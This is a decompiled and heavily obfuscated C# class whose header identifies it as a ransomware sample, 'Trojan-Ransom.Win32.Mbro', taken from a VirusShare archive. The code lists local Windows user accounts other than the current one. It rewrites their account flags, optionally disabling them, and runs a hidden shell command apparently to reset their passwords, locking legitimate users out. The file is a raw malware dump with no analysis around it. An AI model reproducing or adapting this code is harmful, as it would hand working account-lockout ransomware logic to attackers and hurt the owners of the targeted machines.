// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=2.0.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: A1C88199-2A68-4E4D-8A5C-4A08B8EE6E68
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Mbro.fki-bc56c8f7cfb8e35479608dd104613a06a644b4ab.exe

using \u0002;
using \u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Runtime.InteropServices;

namespace \u0006
{
  internal class \u0001
  {
    private static string \u0001;
    private static string \u0002;
    private static string \u0003;
    private static string \u0004;
    private static List<string> \u0001;
    private static string \u0005;
    [NonSerialized]
    internal static \u0007 \u0007;

    static \u0001()
    {
      if (false)
        return;
      \u0006.\u0002.\u0001(typeof (\u0001));
      \u0001.\u0001 = \u0001.\u0007(1719);
      \u0001.\u0002 = \u0001.\u0007(1732);
      \u0001.\u0003 = \u0001.\u0007(1741);
      do
      {
        \u0001.\u0004 = \u0001.\u0007(1786);
      }
      while (false);
      \u0001.\u0001 = \u0001.\u0001(\u007F.\u0016\u0002());
      \u0001.\u0005 = \u007F.\u0017\u0002();
    }

    public static void \u0001([In] string obj0, [In] string obj1)
    {
      int num = \u009C.\u009A\u0002(\u0014\u0002.\u0012\u0003(\u0001.\u0007(1831), obj0, \u0001.\u0007(1844), obj1), AppWinStyle.MinimizedFocus, false, -1);
    }

    public static void \u0001()
    {
label_0:
      List<string>.Enumerator enumerator;
      try
      {
        enumerator = \u0001.\u0001.GetEnumerator();
        while (enumerator.MoveNext())
        {
          if (true)
          {
            string current;
            if (true)
            {
              current = enumerator.Current;
              if (\u0014.\u0001\u0002(current, \u0001.\u0005, false) == 0)
                continue;
            }
            \u0001.\u0001(current, false);
          }
          else
            goto label_0;
        }
      }
      finally
      {
        if (true)
          enumerator.Dispose();
      }
    }

    public static unsafe string \u0001([In] string obj0, [In] bool obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(20);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num;
      DirectoryEntry directoryEntry1 = \u0001.\u0001();
      string str = \u0001.\u0002;
      if (directoryEntry1 != null)
        goto label_9;
label_6:
      \u0012.\u007E\u0096((object) directoryEntry1);
      \u0012.\u007E\u0093((object) directoryEntry1);
      return str;
label_9:
      if (\u0001.\u0001(obj0))
      {
        try
        {
          DirectoryEntry directoryEntry2 = \u0016\u0002.\u007E\u0014\u0003((object) \u0015\u0002.\u007E\u0013\u0003((object) directoryEntry1), obj0, \u0001.\u0007(1849));
          *(int*) ((IntPtr) voidPtr + 4) = 512;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
          *(int*) ((IntPtr) voidPtr + 8) = 64;
          *(int*) voidPtr = 65536;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4) | *(int*) voidPtr | *(int*) ((IntPtr) voidPtr + 8);
          if (!obj1)
          {
            *(int*) ((IntPtr) voidPtr + 16) = 2;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) | *(int*) ((IntPtr) voidPtr + 16);
          }
          object obj = \u0017\u0002.\u007E\u0015\u0003((object) directoryEntry2, \u0001.\u0007(1858), new object[2]
          {
            (object) \u0001.\u0007(1863),
            (object) *(int*) ((IntPtr) voidPtr + 12)
          });
          \u0012.\u007E\u0095((object) directoryEntry2);
          str = \u0001.\u0001;
          \u0012.\u007E\u0096((object) directoryEntry2);
          \u0012.\u007E\u0093((object) directoryEntry2);
          goto label_6;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          str = \u0010.\u007E\u008D((object) exception);
          \u001C.\u000F\u0002();
          goto label_6;
        }
      }
      else
      {
        str = \u0001.\u0003;
        goto label_6;
      }
    }

    private static bool \u0001([In] string obj0)
    {
      DirectoryEntry directoryEntry1 = \u0001.\u0001();
      if (true)
        goto label_9;
label_1:
      int num = 0;
      if (num != 0)
        return num != 0;
      bool flag = num != 0;
      DirectoryEntry directoryEntry2;
      do
      {
        if (directoryEntry2 != null)
        {
          try
          {
            if (\u0016\u0002.\u007E\u0014\u0003((object) \u0015\u0002.\u007E\u0013\u0003((object) directoryEntry2), obj0, \u0001.\u0007(1849)) != null)
              flag = true;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            flag = false;
            if (true)
              \u001C.\u000F\u0002();
          }
        }
        \u0012.\u007E\u0096((object) directoryEntry2);
        \u0012.\u007E\u0093((object) directoryEntry2);
      }
      while (false);
      return flag;
label_9:
      directoryEntry2 = directoryEntry1;
      goto label_1;
    }

    private static DirectoryEntry \u0001()
    {
      DirectoryEntry directoryEntry;
      try
      {
        directoryEntry = new DirectoryEntry(\u000F\u0002.\u0008\u0003(\u0001.\u0007(1876), \u007F.\u0016\u0002(), \u0001.\u0007(1889)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          directoryEntry = (DirectoryEntry) null;
          \u001C.\u000F\u0002();
        }
        while (false);
      }
      return directoryEntry;
    }

    public static List<string> \u0001([In] string obj0)
    {
      List<string> stringList;
      if (true)
      {
        DirectoryEntry directoryEntry = new DirectoryEntry(\u0001.\u0007(1876) + obj0);
        stringList = new List<string>();
        IEnumerator enumerator;
        try
        {
          enumerator = directoryEntry.Children.GetEnumerator();
          while (true)
          {
            DirectoryEntry current;
            while (true)
            {
              if (enumerator.MoveNext())
                current = (DirectoryEntry) enumerator.Current;
              else
                goto label_8;
label_4:
              if (Operators.CompareString(current.SchemaClassName, \u0001.\u0007(1902), false) != 0)
                continue;
              break;
label_8:
              if (false)
                goto label_4;
              else
                goto label_13;
            }
            stringList.Add(current.Name);
          }
        }
        finally
        {
          while (enumerator is IDisposable)
          {
            if (true)
            {
              (enumerator as IDisposable).Dispose();
              break;
            }
          }
        }
      }
label_13:
      return stringList;
    }
  }
}
